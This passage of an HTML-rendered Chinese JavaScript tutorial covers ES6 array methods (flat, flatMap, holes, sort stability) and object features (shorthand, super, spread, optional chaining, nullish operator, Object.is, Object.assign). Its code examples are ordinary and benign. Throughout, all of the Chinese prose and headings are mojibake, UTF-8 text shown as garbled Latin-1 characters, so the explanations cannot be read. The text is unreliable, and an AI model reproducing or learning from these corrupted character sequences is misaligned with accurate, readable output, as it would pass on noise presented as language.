class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>)</span><br><span class="line"><span class="comment">// -1</span></span><br></pre></td></tr></table></figure></li></ul><p>Map å’Œ Set æ•°æ®ç»“æ„æœ‰ä¸€ä¸ª<code>has</code>æ–¹æ³•ï¼Œéœ€è¦æ³¨æ„ä¸<code>includes</code>åŒºåˆ†ã€‚</p><ul><li>Map ç»“æ„çš„<code>has</code>æ–¹æ³•ï¼Œæ˜¯ç”¨æ¥æŸ¥æ‰¾é”®åçš„ï¼Œæ¯”å¦‚<code>Map.prototype.has(key)</code>ã€<code>WeakMap.prototype.has(key)</code>ã€<code>Reflect.has(target, propertyKey)</code>ã€‚</li><li>Set ç»“æ„çš„<code>has</code>æ–¹æ³•ï¼Œæ˜¯ç”¨æ¥æŸ¥æ‰¾å€¼çš„ï¼Œæ¯”å¦‚<code>Set.prototype.has(value)</code>ã€<code>WeakSet.prototype.has(value)</code>ã€‚</li></ul><h2 id="9ã€æ•°ç»„å®ä¾‹çš„-flat-ï¼ŒflatMap"><a href="#9ã€æ•°ç»„å®ä¾‹çš„-flat-ï¼ŒflatMap" class="headerlink" title="9ã€æ•°ç»„å®ä¾‹çš„ flat()ï¼ŒflatMap()"></a>9ã€æ•°ç»„å®ä¾‹çš„ flat()ï¼ŒflatMap()</h2><p><code>Array.prototype.flat()</code>ç”¨äºå°†åµŒå¥—çš„æ•°ç»„â€œæ‹‰å¹³â€ï¼Œå˜æˆä¸€ç»´çš„æ•°ç»„ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼Œå¯¹åŸæ•°æ®æ²¡æœ‰å½±å“ã€‚<code>flat()</code>é»˜è®¤åªä¼šâ€œæ‹‰å¹³â€ä¸€å±‚ï¼Œå¦‚æœæƒ³è¦â€œæ‹‰å¹³â€å¤šå±‚çš„åµŒå¥—æ•°ç»„ï¼Œå¯ä»¥å°†<code>flat()</code>æ–¹æ³•çš„å‚æ•°å†™æˆä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæƒ³è¦æ‹‰å¹³çš„å±‚æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]].flat()</span><br><span class="line"><span class="comment">// [1, 2, 3, [4, 5]]</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>]]].flat(<span class="number">2</span>)</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸ç®¡æœ‰å¤šå°‘å±‚åµŒå¥—ï¼Œéƒ½è¦è½¬æˆä¸€ç»´æ•°ç»„ï¼Œå¯ä»¥ç”¨<code>Infinity</code>å…³é”®å­—ä½œä¸ºå‚æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, [<span class="number">2</span>, [<span class="number">3</span>]]].flat(<span class="literal">Infinity</span>)</span><br><span class="line"><span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>å¦‚æœåŸæ•°ç»„æœ‰ç©ºä½ï¼Œ<code>flat()</code>æ–¹æ³•ä¼šè·³è¿‡ç©ºä½ã€‚</p><p><code>flatMap()</code>æ–¹æ³•å¯¹åŸæ•°ç»„çš„æ¯ä¸ªæˆå‘˜æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼ˆç›¸å½“äºæ‰§è¡Œ<code>Array.prototype.map()</code>ï¼‰ï¼Œç„¶åå¯¹è¿”å›å€¼ç»„æˆçš„æ•°ç»„æ‰§è¡Œ<code>flat()</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼Œä¸æ”¹å˜åŸæ•°ç»„ã€‚<code>flatMap()</code>åªèƒ½å±•å¼€ä¸€å±‚æ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç›¸å½“äº [[2, 4], [3, 6], [4, 8]].flat()</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].flatMap(<span class="function"><span class="params">x</span> =&gt;</span> [x, x * <span class="number">2</span>])</span><br><span class="line"><span class="comment">// [2, 4, 3, 6, 4, 8]</span></span><br></pre></td></tr></table></figure><h2 id="10ã€æ•°ç»„çš„ç©ºä½"><a href="#10ã€æ•°ç»„çš„ç©ºä½" class="headerlink" title="10ã€æ•°ç»„çš„ç©ºä½"></a>10ã€æ•°ç»„çš„ç©ºä½</h2><p>æ•°ç»„çš„ç©ºä½æŒ‡ï¼Œæ•°ç»„çš„æŸä¸€ä¸ªä½ç½®æ²¡æœ‰ä»»ä½•å€¼ã€‚æ³¨æ„ï¼Œç©ºä½ä¸æ˜¯<code>undefined</code>ï¼Œä¸€ä¸ªä½ç½®çš„å€¼ç­‰äº<code>undefined</code>ï¼Œä¾ç„¶æ˜¯æœ‰å€¼çš„ã€‚ç©ºä½æ˜¯æ²¡æœ‰ä»»ä½•å€¼ã€‚</p><p>ES6 æ˜ç¡®å°†ç©ºä½è½¬ä¸º<code>undefined</code>ã€‚<code>Array.from</code>æ–¹æ³•ä¼šå°†æ•°ç»„çš„ç©ºä½ï¼Œè½¬ä¸º<code>undefined</code>ã€‚æ‰©å±•è¿ç®—ç¬¦ï¼ˆ<code>...</code>ï¼‰ä¹Ÿä¼šå°†ç©ºä½è½¬ä¸º<code>undefined</code>ã€‚</p><h2 id="11ã€Array-prototype-sort-çš„æ’åºç¨³å®šæ€§"><a href="#11ã€Array-prototype-sort-çš„æ’åºç¨³å®šæ€§" class="headerlink" title="11ã€Array.prototype.sort() çš„æ’åºç¨³å®šæ€§"></a>11ã€Array.prototype.sort() çš„æ’åºç¨³å®šæ€§</h2><p>å¸¸è§çš„æ’åºç®—æ³•ä¹‹ä¸­ï¼Œæ’å…¥æ’åºã€åˆå¹¶æ’åºã€å†’æ³¡æ’åºç­‰éƒ½æ˜¯ç¨³å®šçš„ï¼Œå †æ’åºã€å¿«é€Ÿæ’åºç­‰æ˜¯ä¸ç¨³å®šçš„ã€‚ä¸ç¨³å®šæ’åºçš„ä¸»è¦ç¼ºç‚¹æ˜¯ï¼Œå¤šé‡æ’åºæ—¶å¯èƒ½ä¼šäº§ç”Ÿé—®é¢˜ã€‚å‡è®¾æœ‰ä¸€ä¸ªå§“å’Œåçš„åˆ—è¡¨ï¼Œè¦æ±‚æŒ‰ç…§â€œå§“æ°ä¸ºä¸»è¦å…³é”®å­—ï¼Œåå­—ä¸ºæ¬¡è¦å…³é”®å­—â€è¿›è¡Œæ’åºã€‚å¼€å‘è€…å¯èƒ½ä¼šå…ˆæŒ‰åå­—æ’åºï¼Œå†æŒ‰å§“æ°è¿›è¡Œæ’åºã€‚å¦‚æœæ’åºç®—æ³•æ˜¯ç¨³å®šçš„ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°â€œå…ˆå§“æ°ï¼Œååå­—â€çš„æ’åºæ•ˆæœã€‚å¦‚æœæ˜¯ä¸ç¨³å®šçš„ï¼Œå°±ä¸è¡Œã€‚</p><p><a href="https://github.com/tc39/ecma262/pull/1340">ES2019</a> æ˜ç¡®è§„å®šï¼Œ<code>Array.prototype.sort()</code>çš„é»˜è®¤æ’åºç®—æ³•å¿…é¡»ç¨³å®šã€‚</p><h1 id="å¯¹è±¡çš„æ‰©å±•"><a href="#å¯¹è±¡çš„æ‰©å±•" class="headerlink" title="å¯¹è±¡çš„æ‰©å±•"></a>å¯¹è±¡çš„æ‰©å±•</h1><h2 id="1ã€å±æ€§çš„ç®€æ´è¡¨ç¤ºæ³•"><a href="#1ã€å±æ€§çš„ç®€æ´è¡¨ç¤ºæ³•" class="headerlink" title="1ã€å±æ€§çš„ç®€æ´è¡¨ç¤ºæ³•"></a>1ã€å±æ€§çš„ç®€æ´è¡¨ç¤ºæ³•</h2><p>ES6 å…è®¸åœ¨å¤§æ‹¬å·é‡Œé¢ï¼Œç›´æ¥å†™å…¥å˜é‡å’Œå‡½æ•°ï¼Œä½œä¸ºå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;x, y&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">x</span>: x, <span class="attr">y</span>: y&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// Object &#123;x: 1, y: 2&#125;</span></span><br></pre></td></tr></table></figure><p>é™¤äº†å±æ€§ç®€å†™ï¼Œæ–¹æ³•ä¹Ÿå¯ä»¥ç®€å†™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> o = &#123;</span><br><span class="line">  <span class="function"><span class="title">method</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> o = &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2ã€å±æ€§åè¡¨è¾¾å¼"><a href="#2ã€å±æ€§åè¡¨è¾¾å¼" class="headerlink" title="2ã€å±æ€§åè¡¨è¾¾å¼"></a>2ã€å±æ€§åè¡¨è¾¾å¼</h2><p>JavaScript å®šä¹‰å¯¹è±¡çš„å±æ€§ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•ä¸€</span></span><br><span class="line">obj.foo = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•äºŒ</span></span><br><span class="line">obj[<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;bc&#x27;</span>] = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><h2 id="3ã€æ–¹æ³•çš„-name-å±æ€§"><a href="#3ã€æ–¹æ³•çš„-name-å±æ€§" class="headerlink" title="3ã€æ–¹æ³•çš„ name å±æ€§"></a>3ã€æ–¹æ³•çš„ name å±æ€§</h2><p>å¯¹è±¡æ–¹æ³•ä¹Ÿæ˜¯å‡½æ•°ï¼Œå› æ­¤ä¹Ÿæœ‰<code>name</code>å±æ€§ã€‚æ–¹æ³•çš„<code>name</code>å±æ€§è¿”å›æ–¹æ³•åã€‚</p><p>å¦‚æœå¯¹è±¡çš„æ–¹æ³•ä½¿ç”¨äº†å–å€¼å‡½æ•°ï¼ˆ<code>getter</code>ï¼‰å’Œå­˜å€¼å‡½æ•°ï¼ˆ<code>setter</code>ï¼‰ï¼Œåˆ™<code>name</code>å±æ€§ä¸æ˜¯åœ¨è¯¥æ–¹æ³•ä¸Šé¢ï¼Œè€Œæ˜¯è¯¥æ–¹æ³•çš„å±æ€§çš„æè¿°å¯¹è±¡çš„<code>get</code>å’Œ<code>set</code>å±æ€§ä¸Šé¢ï¼Œè¿”å›å€¼æ˜¯æ–¹æ³•åå‰åŠ ä¸Š<code>get</code>å’Œ<code>set</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">foo</span>() &#123;&#125;,</span><br><span class="line">  <span class="keyword">set</span> <span class="title">foo</span>(<span class="params">x</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo.name</span><br><span class="line"><span class="comment">// TypeError: Cannot read property &#x27;name&#x27; of undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line">descriptor.get.name <span class="comment">// &quot;get foo&quot;</span></span><br><span class="line">descriptor.set.name <span class="comment">// &quot;set foo&quot;</span></span><br></pre></td></tr></table></figure><h2 id="4ã€å±æ€§çš„å¯æšä¸¾æ€§å’Œéå†"><a href="#4ã€å±æ€§çš„å¯æšä¸¾æ€§å’Œéå†" class="headerlink" title="4ã€å±æ€§çš„å¯æšä¸¾æ€§å’Œéå†"></a>4ã€å±æ€§çš„å¯æšä¸¾æ€§å’Œéå†</h2><h3 id="å¯æšä¸¾æ€§"><a href="#å¯æšä¸¾æ€§" class="headerlink" title="å¯æšä¸¾æ€§"></a>å¯æšä¸¾æ€§</h3><p>å¯¹è±¡çš„æ¯ä¸ªå±æ€§éƒ½æœ‰ä¸€ä¸ªæè¿°å¯¹è±¡ï¼ˆDescriptorï¼‰ï¼Œç”¨æ¥æ§åˆ¶è¯¥å±æ€§çš„è¡Œä¸ºã€‚<code>Object.getOwnPropertyDescriptor</code>æ–¹æ³•å¯ä»¥è·å–è¯¥å±æ€§çš„æè¿°å¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, <span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="comment">//  &#123;</span></span><br><span class="line"><span class="comment">//    value: 123,</span></span><br><span class="line"><span class="comment">//    writable: true,</span></span><br><span class="line"><span class="comment">//    enumerable: true,</span></span><br><span class="line"><span class="comment">//    configurable: true</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br></pre></td></tr></table></figure><h3 id="å±æ€§çš„éå†"><a href="#å±æ€§çš„éå†" class="headerlink" title="å±æ€§çš„éå†"></a>å±æ€§çš„éå†</h3><p>ES6 ä¸€å…±æœ‰ 5 ç§æ–¹æ³•å¯ä»¥éå†å¯¹è±¡çš„å±æ€§ã€‚</p><p><strong>ï¼ˆ1ï¼‰forâ€¦in</strong></p><p><code>for...in</code>å¾ªç¯éå†å¯¹è±¡è‡ªèº«çš„å’Œç»§æ‰¿çš„å¯æšä¸¾å±æ€§ï¼ˆä¸å« Symbol å±æ€§ï¼‰ã€‚</p><p><strong>ï¼ˆ2ï¼‰Object.keys(obj)</strong></p><p><code>Object.keys</code>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…æ‹¬å¯¹è±¡è‡ªèº«çš„ï¼ˆä¸å«ç»§æ‰¿çš„ï¼‰æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼ˆä¸å« Symbol å±æ€§ï¼‰çš„é”®åã€‚</p><p><strong>ï¼ˆ3ï¼‰Object.getOwnPropertyNames(obj)</strong></p><p><code>Object.getOwnPropertyNames</code>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¯¹è±¡è‡ªèº«çš„æ‰€æœ‰å±æ€§ï¼ˆä¸å« Symbol å±æ€§ï¼Œä½†æ˜¯åŒ…æ‹¬ä¸å¯æšä¸¾å±æ€§ï¼‰çš„é”®åã€‚</p><p><strong>ï¼ˆ4ï¼‰Object.getOwnPropertySymbols(obj)</strong></p><p><code>Object.getOwnPropertySymbols</code>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¯¹è±¡è‡ªèº«çš„æ‰€æœ‰ Symbol å±æ€§çš„é”®åã€‚</p><p><strong>ï¼ˆ5ï¼‰Reflect.ownKeys(obj)</strong></p><p><code>Reflect.ownKeys</code>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«å¯¹è±¡è‡ªèº«çš„ï¼ˆä¸å«ç»§æ‰¿çš„ï¼‰æ‰€æœ‰é”®åï¼Œä¸ç®¡é”®åæ˜¯ Symbol æˆ–å­—ç¬¦ä¸²ï¼Œä¹Ÿä¸ç®¡æ˜¯å¦å¯æšä¸¾ã€‚</p><p>ä»¥ä¸Šçš„ 5 ç§æ–¹æ³•éå†å¯¹è±¡çš„é”®åï¼Œéƒ½éµå®ˆåŒæ ·çš„å±æ€§éå†çš„æ¬¡åºè§„åˆ™ã€‚</p><ul><li>é¦–å…ˆéå†æ‰€æœ‰æ•°å€¼é”®ï¼ŒæŒ‰ç…§æ•°å€¼å‡åºæ’åˆ—ã€‚</li><li>å…¶æ¬¡éå†æ‰€æœ‰å­—ç¬¦ä¸²é”®ï¼ŒæŒ‰ç…§åŠ å…¥æ—¶é—´å‡åºæ’åˆ—ã€‚</li><li>æœ€åéå†æ‰€æœ‰ Symbol é”®ï¼ŒæŒ‰ç…§åŠ å…¥æ—¶é—´å‡åºæ’åˆ—ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.ownKeys(&#123; [<span class="built_in">Symbol</span>()]:<span class="number">0</span>, <span class="attr">b</span>:<span class="number">0</span>, <span class="number">10</span>:<span class="number">0</span>, <span class="number">2</span>:<span class="number">0</span>, <span class="attr">a</span>:<span class="number">0</span> &#125;)</span><br><span class="line"><span class="comment">// [&#x27;2&#x27;, &#x27;10&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, Symbol()]</span></span><br></pre></td></tr></table></figure><h2 id="5ã€super-å…³é”®å­—"><a href="#5ã€super-å…³é”®å­—" class="headerlink" title="5ã€super å…³é”®å­—"></a>5ã€super å…³é”®å­—</h2><p><code>this</code>å…³é”®å­—æ€»æ˜¯æŒ‡å‘å‡½æ•°æ‰€åœ¨çš„å½“å‰å¯¹è±¡ï¼ŒES6 åˆæ–°å¢äº†å¦ä¸€ä¸ªç±»ä¼¼çš„å…³é”®å­—<code>super</code>ï¼ŒæŒ‡å‘å½“å‰å¯¹è±¡çš„åŸå‹å¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> proto = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;world&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">find</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.foo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line">obj.find() <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œ<code>super</code>å…³é”®å­—è¡¨ç¤ºåŸå‹å¯¹è±¡æ—¶ï¼Œåªèƒ½ç”¨åœ¨å¯¹è±¡çš„æ–¹æ³•ä¹‹ä¸­ã€‚</p><p>JavaScript å¼•æ“å†…éƒ¨ï¼Œ<code>super.foo</code>ç­‰åŒäº<code>Object.getPrototypeOf(this).foo</code>ï¼ˆå±æ€§ï¼‰æˆ–<code>Object.getPrototypeOf(this).foo.call(this)</code>ï¼ˆæ–¹æ³•ï¼‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> proto = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.x);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="string">&#x27;world&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.foo();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line"></span><br><span class="line">obj.foo() <span class="comment">// &quot;world&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>super.foo</code>æŒ‡å‘åŸå‹å¯¹è±¡<code>proto</code>çš„<code>foo</code>æ–¹æ³•ï¼Œä½†æ˜¯ç»‘å®šçš„<code>this</code>å´è¿˜æ˜¯å½“å‰å¯¹è±¡<code>obj</code>ï¼Œå› æ­¤è¾“å‡ºçš„å°±æ˜¯<code>world</code>ã€‚</p><h2 id="6ã€å¯¹è±¡çš„æ‰©å±•è¿ç®—ç¬¦"><a href="#6ã€å¯¹è±¡çš„æ‰©å±•è¿ç®—ç¬¦" class="headerlink" title="6ã€å¯¹è±¡çš„æ‰©å±•è¿ç®—ç¬¦"></a>6ã€å¯¹è±¡çš„æ‰©å±•è¿ç®—ç¬¦</h2><p>æ‰©å±•è¿ç®—ç¬¦ï¼ˆ<code>...</code>ï¼‰ï¼ŒåŒã€Šæ•°ç»„çš„æ‰©å±•ã€‹</p><p>å¯¹è±¡çš„æ‰©å±•è¿ç®—ç¬¦ç­‰åŒäºä½¿ç”¨<code>Object.assign()</code>æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> aClone = &#123; ...a &#125;;</span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"><span class="keyword">let</span> aClone = <span class="built_in">Object</span>.assign(&#123;&#125;, a);</span><br></pre></td></tr></table></figure><h2 id="7ã€é“¾åˆ¤æ–­è¿ç®—ç¬¦"><a href="#7ã€é“¾åˆ¤æ–­è¿ç®—ç¬¦" class="headerlink" title="7ã€é“¾åˆ¤æ–­è¿ç®—ç¬¦"></a>7ã€é“¾åˆ¤æ–­è¿ç®—ç¬¦</h2><p> ES2020å¼•å…¥äº†â€œé“¾åˆ¤æ–­è¿ç®—ç¬¦â€<code>?.</code></p><h2 id="8ã€Null-åˆ¤æ–­è¿ç®—ç¬¦"><a href="#8ã€Null-åˆ¤æ–­è¿ç®—ç¬¦" class="headerlink" title="8ã€Null åˆ¤æ–­è¿ç®—ç¬¦"></a>8ã€Null åˆ¤æ–­è¿ç®—ç¬¦</h2><p>è¯»å–å¯¹è±¡å±æ€§çš„æ—¶å€™ï¼Œå¦‚æœæŸä¸ªå±æ€§çš„å€¼æ˜¯<code>null</code>æˆ–<code>undefined</code>ï¼Œæœ‰æ—¶å€™éœ€è¦ä¸ºå®ƒä»¬æŒ‡å®šé»˜è®¤å€¼ã€‚å¸¸è§åšæ³•æ˜¯é€šè¿‡<code>||</code>è¿ç®—ç¬¦æŒ‡å®šé»˜è®¤å€¼ã€‚</p><p>ä½†æ˜¯è¿™æ ·å†™æ˜¯é”™çš„ã€‚å¼€å‘è€…çš„åŸæ„æ˜¯ï¼Œåªè¦å±æ€§çš„å€¼ä¸º<code>null</code>æˆ–<code>undefined</code>ï¼Œé»˜è®¤å€¼å°±ä¼šç”Ÿæ•ˆï¼Œä½†æ˜¯å±æ€§çš„å€¼å¦‚æœä¸ºç©ºå­—ç¬¦ä¸²æˆ–<code>false</code>æˆ–<code>0</code>ï¼Œé»˜è®¤å€¼ä¹Ÿä¼šç”Ÿæ•ˆã€‚</p><p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œ<a href="https://github.com/tc39/proposal-nullish-coalescing">ES2020</a> å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ Null åˆ¤æ–­è¿ç®—ç¬¦<code>??</code>ã€‚å®ƒçš„è¡Œä¸ºç±»ä¼¼<code>||</code>ï¼Œä½†æ˜¯åªæœ‰è¿ç®—ç¬¦å·¦ä¾§çš„å€¼ä¸º<code>null</code>æˆ–<code>undefined</code>æ—¶ï¼Œæ‰ä¼šè¿”å›å³ä¾§çš„å€¼ã€‚</p><h1 id="å¯¹è±¡çš„æ–°å¢æ–¹æ³•"><a href="#å¯¹è±¡çš„æ–°å¢æ–¹æ³•" class="headerlink" title="å¯¹è±¡çš„æ–°å¢æ–¹æ³•"></a>å¯¹è±¡çš„æ–°å¢æ–¹æ³•</h1><h2 id="1ã€Object-is"><a href="#1ã€Object-is" class="headerlink" title="1ã€Object.is()"></a>1ã€Object.is()</h2><p>ES5 æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œåªæœ‰ä¸¤ä¸ªè¿ç®—ç¬¦ï¼šç›¸ç­‰è¿ç®—ç¬¦ï¼ˆ<code>==</code>ï¼‰å’Œä¸¥æ ¼ç›¸ç­‰è¿ç®—ç¬¦ï¼ˆ<code>===</code>ï¼‰ã€‚å®ƒä»¬éƒ½æœ‰ç¼ºç‚¹ï¼Œå‰è€…ä¼šè‡ªåŠ¨è½¬æ¢æ•°æ®ç±»å‹ï¼Œåè€…çš„<code>NaN</code>ä¸ç­‰äºè‡ªèº«ï¼Œä»¥åŠ<code>+0</code>ç­‰äº<code>-0</code>ã€‚</p><p>Object.isç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ä¸¥æ ¼ç›¸ç­‰ã€‚</p><h2 id="2ã€Object-assign"><a href="#2ã€Object-assign" class="headerlink" title="2ã€Object.assign()"></a>2ã€Object.assign()</h2><p><code>Object.assign()</code>æ–¹æ³•ç”¨äºå¯¹è±¡çš„åˆå¹¶ï¼Œå°†æºå¯¹è±¡ï¼ˆsourceï¼‰çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼Œå¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ï¼ˆtargetï¼‰ã€‚<code>Object.assign()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡å¯¹è±¡ï¼Œåé¢çš„å‚æ•°éƒ½æ˜¯æºå¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source1 = &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> source2 = &#123; <span class="attr">c</span>: <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(target, source1, source2);</span><br><span class="line">target <span class="comment">// &#123;a:1, b:2, c:3&#125;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå¦‚æœç›®æ ‡å¯¹è±¡ä¸æºå¯¹è±¡æœ‰åŒåå±æ€§ï¼Œæˆ–å¤šä¸ªæºå¯¹è±¡æœ‰åŒåå±æ€§ï¼Œåˆ™åé¢çš„å±æ€§ä¼šè¦†ç›–å‰é¢çš„å±æ€§ã€‚</p><h3 id="æ³¨æ„ç‚¹-1"><a href="#æ³¨æ„ç‚¹-1" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><p><strong>ï¼ˆ1ï¼‰æµ…æ‹·è´</strong></p><p><code>Object.assign()</code>æ–¹æ³•å®è¡Œçš„æ˜¯æµ…æ‹·è´ï¼Œè€Œä¸æ˜¯æ·±æ‹·è´ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæºå¯¹è±¡æŸä¸ªå±æ€§çš„å€¼æ˜¯å¯¹è±¡ï¼Œé‚£ä¹ˆç›®æ ‡å¯¹è±¡æ‹·è´å¾—åˆ°çš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</p><p><strong>ï¼ˆ2ï¼‰åŒåå±æ€§çš„æ›¿æ¢</strong></p><p>å¯¹äºè¿™ç§åµŒå¥—çš„å¯¹è±¡ï¼Œä¸€æ—¦é‡åˆ°åŒåå±æ€§ï¼Œ<code>Object.assign()</code>çš„å¤„ç†æ–¹æ³•æ˜¯æ›¿æ¢ï¼Œè€Œä¸æ˜¯æ·»åŠ ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> target = &#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: <span class="string">&#x27;c&#x27;</span>, <span class="attr">d</span>: <span class="string">&#x27;e&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="keyword">const</span> source = &#123; <span class="attr">a</span>: &#123; <span class="attr">b</span>: <span class="string">&#x27;hello&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="built_in">Object</span>.assign(target, source)</span><br><span class="line"><span class="comment">// &#123; a: &#123; b: &#x27;hello&#x27; &#125; 